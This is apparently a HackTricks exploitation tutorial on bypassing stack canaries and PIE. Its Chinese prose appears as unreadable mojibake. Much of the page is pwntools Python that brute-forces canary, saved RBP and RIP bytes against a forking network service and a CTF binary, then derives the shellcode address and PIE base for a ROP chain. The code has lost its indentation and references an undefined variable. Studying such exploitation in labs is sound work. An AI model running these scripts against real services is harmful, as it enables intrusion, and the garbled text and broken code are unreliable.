<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


**å¦‚æœæ‚¨é¢å¯¹ä¸€ä¸ªç”±canaryå’ŒPIEï¼ˆä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶ï¼‰ä¿æŠ¤çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ‚¨å¯èƒ½éœ€è¦æ‰¾åˆ°ä¸€ç§ç»•è¿‡å®ƒä»¬çš„æ–¹æ³•ã€‚**

![](<../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
è¯·æ³¨æ„ï¼Œ**`checksec`**å¯èƒ½æ— æ³•å‘ç°ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶å—åˆ°canaryä¿æŠ¤ï¼Œå¦‚æœå®ƒæ˜¯é™æ€ç¼–è¯‘çš„ï¼Œå¹¶ä¸”æ— æ³•è¯†åˆ«è¯¥å‡½æ•°ã€‚\
ä½†æ˜¯ï¼Œæ‚¨å¯ä»¥æ‰‹åŠ¨æ³¨æ„åˆ°è¿™ä¸€ç‚¹ï¼Œå¦‚æœæ‚¨å‘ç°åœ¨å‡½æ•°è°ƒç”¨å¼€å§‹æ—¶å°†ä¸€ä¸ªå€¼ä¿å­˜åœ¨å †æ ˆä¸­ï¼Œå¹¶ä¸”åœ¨é€€å‡ºä¹‹å‰æ£€æŸ¥äº†è¿™ä¸ªå€¼ã€‚
{% endhint %}

# å¼ºåˆ¶ç ´è§£Canary

ç»•è¿‡ç®€å•canaryçš„æœ€ä½³æ–¹æ³•æ˜¯ï¼Œå¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶æ˜¯ä¸€ä¸ªç¨‹åºï¼Œ**æ¯æ¬¡æ‚¨ä¸å…¶å»ºç«‹æ–°è¿æ¥æ—¶éƒ½ä¼šforkå­è¿›ç¨‹**ï¼ˆç½‘ç»œæœåŠ¡ï¼‰ï¼Œå› ä¸ºæ¯æ¬¡è¿æ¥åˆ°å®ƒæ—¶**å°†ä½¿ç”¨ç›¸åŒçš„canary**ã€‚

å› æ­¤ï¼Œç»•è¿‡canaryçš„æœ€ä½³æ–¹æ³•å°±æ˜¯**é€ä¸ªå­—ç¬¦åœ°å¼ºåˆ¶ç ´è§£å®ƒ**ï¼Œæ‚¨å¯ä»¥é€šè¿‡æ£€æŸ¥ç¨‹åºæ˜¯å¦å´©æºƒæˆ–ç»§ç»­å…¶æ­£å¸¸æµç¨‹æ¥åˆ¤æ–­çŒœæµ‹çš„canaryå­—èŠ‚æ˜¯å¦æ­£ç¡®ã€‚åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œå‡½æ•°**å¼ºåˆ¶ç ´è§£ä¸€ä¸ª8å­—èŠ‚çš„canaryï¼ˆx64ï¼‰**ï¼Œå¹¶åŒºåˆ†äº†æ­£ç¡®çŒœæµ‹çš„å­—èŠ‚å’Œé”™è¯¯å­—èŠ‚ï¼Œåªéœ€**æ£€æŸ¥**æœåŠ¡å™¨æ˜¯å¦å‘é€äº†**å“åº”**ï¼ˆåœ¨**å…¶ä»–æƒ…å†µ**ä¸‹ï¼Œå¦ä¸€ç§æ–¹æ³•å¯èƒ½æ˜¯ä½¿ç”¨**try/except**ï¼‰ï¼š

## ç¤ºä¾‹1

æ­¤ç¤ºä¾‹æ˜¯ä¸º64ä½å®ç°çš„ï¼Œä½†ä¹Ÿå¯ä»¥è½»æ¾ä¸º32ä½å®ç°ã€‚
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
## ä¾‹å­2

è¿™æ˜¯ä¸º32ä½ç³»ç»Ÿå®ç°çš„ï¼Œä½†å¾ˆå®¹æ˜“æ”¹ä¸º64ä½ã€‚\
è¿˜è¦æ³¨æ„ï¼Œå¯¹äºè¿™ä¸ªä¾‹å­ï¼Œ**ç¨‹åºé¢„æœŸé¦–å…ˆæœ‰ä¸€ä¸ªå­—èŠ‚æ¥æŒ‡ç¤ºè¾“å…¥å’Œæœ‰æ•ˆè½½è·çš„å¤§å°**ã€‚
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
# æ‰“å° Canary

ç»•è¿‡ canary çš„å¦ä¸€ç§æ–¹æ³•æ˜¯**æ‰“å°å®ƒ**ã€‚\
æƒ³è±¡ä¸€ç§æƒ…å†µï¼Œä¸€ä¸ª**æ˜“å—æ”»å‡»**çš„ç¨‹åºå¯ä»¥æ‰§è¡Œä¸€ä¸ªæŒ‡å‘**æ ˆæº¢å‡ºéƒ¨åˆ†**çš„ **puts** å‡½æ•°ã€‚æ”»å‡»è€…çŸ¥é“ canary çš„**ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ç©ºå­—èŠ‚** (`\x00`)ï¼Œå…¶ä½™çš„ canary æ˜¯**éšæœº**å­—èŠ‚ã€‚ç„¶åï¼Œæ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªæº¢å‡ºï¼Œ**è¦†ç›–æ ˆç›´åˆ° canary çš„ç¬¬ä¸€ä¸ªå­—èŠ‚**ã€‚\
ç„¶åï¼Œæ”»å‡»è€…åœ¨æœ‰æ•ˆè´Ÿè½½çš„ä¸­é—´**è°ƒç”¨ puts åŠŸèƒ½**ï¼Œè¿™å°†**æ‰“å°å‡ºæ‰€æœ‰çš„ canary**ï¼ˆé™¤äº†ç¬¬ä¸€ä¸ªç©ºå­—èŠ‚ï¼‰ã€‚\
æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œæ”»å‡»è€…å¯ä»¥**æ„é€ å¹¶å‘é€ä¸€ä¸ªæ–°çš„æ”»å‡»**ï¼ŒçŸ¥é“äº† canaryï¼ˆåœ¨**åŒä¸€ä¸ªç¨‹åºä¼šè¯**ä¸­ï¼‰ã€‚

æ˜¾ç„¶ï¼Œè¿™ç§ç­–ç•¥éå¸¸**å—é™**ï¼Œå› ä¸ºæ”»å‡»è€…éœ€è¦èƒ½å¤Ÿ**æ‰“å°**ä»–çš„**æœ‰æ•ˆè´Ÿè½½**çš„**å†…å®¹**ï¼Œä»¥**çªƒå–** canaryï¼Œç„¶åèƒ½å¤Ÿåˆ›å»ºä¸€ä¸ªæ–°çš„æœ‰æ•ˆè´Ÿè½½ï¼ˆåœ¨**åŒä¸€ä¸ªç¨‹åºä¼šè¯**ä¸­ï¼‰å¹¶**å‘é€****çœŸæ­£çš„ç¼“å†²åŒºæº¢å‡º**ã€‚\
CTF ç¤ºä¾‹ï¼š[https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)

# PIE

ä¸ºäº†ç»•è¿‡ PIEï¼Œæ‚¨éœ€è¦**æ³„æ¼ä¸€äº›åœ°å€**ã€‚å¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶æ²¡æœ‰æ³„æ¼ä»»ä½•åœ°å€ï¼Œæœ€å¥½çš„æ–¹æ³•æ˜¯**æš´åŠ›ç ´è§£ä¿å­˜åœ¨æ ˆä¸­çš„ RBP å’Œ RIP**ã€‚\
ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶åŒæ—¶ä½¿ç”¨**canary**å’Œ**PIE**è¿›è¡Œä¿æŠ¤ï¼Œæ‚¨å¯ä»¥å¼€å§‹æš´åŠ›ç ´è§£ canaryï¼Œç„¶å**æ¥ä¸‹æ¥**çš„ 8 ä¸ªå­—èŠ‚ï¼ˆx64ï¼‰å°†æ˜¯ä¿å­˜çš„**RBP**ï¼Œå†æ¥ä¸‹æ¥çš„ 8 ä¸ªå­—èŠ‚å°†æ˜¯ä¿å­˜çš„**RIP**ã€‚

è¦ä»äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æš´åŠ›ç ´è§£ RBP å’Œ RIPï¼Œæ‚¨å¯ä»¥å‘ç°ï¼Œå¦‚æœç¨‹åºè¾“å‡ºäº†ä¸€äº›å†…å®¹æˆ–è€…æ²¡æœ‰å´©æºƒï¼Œé‚£ä¹ˆçŒœæµ‹çš„å­—èŠ‚æ˜¯æ­£ç¡®çš„ã€‚ä¸ç”¨äºæš´åŠ›ç ´è§£ canary çš„ç›¸åŒåŠŸèƒ½å¯ç”¨äºæš´åŠ›ç ´è§£ RBP å’Œ RIPï¼š
```python
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
## è·å–åŸºåœ°å€

è¦æ‰“è´¥PIEçš„æœ€åä¸€æ­¥æ˜¯è®¡ç®—ä»æ³„æ¼çš„åœ°å€ä¸­è·å¾—çš„æœ‰ç”¨åœ°å€ï¼š**RBP**å’Œ**RIP**ã€‚

é€šè¿‡**RBP**ï¼Œä½ å¯ä»¥è®¡ç®—**åœ¨å †æ ˆä¸­å†™å…¥shellcodeçš„ä½ç½®**ã€‚è¿™å¯¹äºçŸ¥é“ä½ å°†åœ¨å †æ ˆä¸­å†™å…¥å­—ç¬¦ä¸² _"/bin/sh\x00"_ çš„ä½ç½®éå¸¸æœ‰ç”¨ã€‚è¦è®¡ç®—æ³„æ¼çš„RBPå’Œä½ çš„shellcodeä¹‹é—´çš„è·ç¦»ï¼Œä½ åªéœ€åœ¨æ³„æ¼RBPåè®¾ç½®ä¸€ä¸ª**æ–­ç‚¹**ï¼Œç„¶åæ£€æŸ¥**shellcodeçš„ä½ç½®**ï¼Œç„¶åä½ å¯ä»¥è®¡ç®—shellcodeå’ŒRBPä¹‹é—´çš„è·ç¦»ï¼š
```python
INI_SHELLCODE = RBP - 1152
```
ä»**RIP**ä¸­ï¼Œæ‚¨å¯ä»¥è®¡ç®—**PIEäºŒè¿›åˆ¶æ–‡ä»¶çš„åŸºåœ°å€**ï¼Œè¿™æ˜¯æ‚¨éœ€è¦åˆ›å»º**æœ‰æ•ˆçš„ROPé“¾**æ‰€éœ€çš„å†…å®¹ã€‚\
è¦è®¡ç®—åŸºåœ°å€ï¼Œåªéœ€æ‰§è¡Œ`objdump -d vunbinary`å¹¶æ£€æŸ¥æœ€æ–°çš„åæ±‡ç¼–åœ°å€ï¼š

![](<../../.gitbook/assets/image (145).png>)

åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°åªéœ€è¦**1å­—èŠ‚åŠ**å°±å¯ä»¥å®šä½æ‰€æœ‰çš„ä»£ç ï¼Œå› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒåŸºåœ°å€å°†æ˜¯**æ³„æ¼çš„RIPï¼Œä½†ä»¥"000"ç»“å°¾**ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ³„æ¼äº†_0x562002970**ecf**_ï¼Œåˆ™åŸºåœ°å€ä¸º_0x562002970**000**_
```python
elf.address = RIP - (RIP & 0xfff)
```
<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
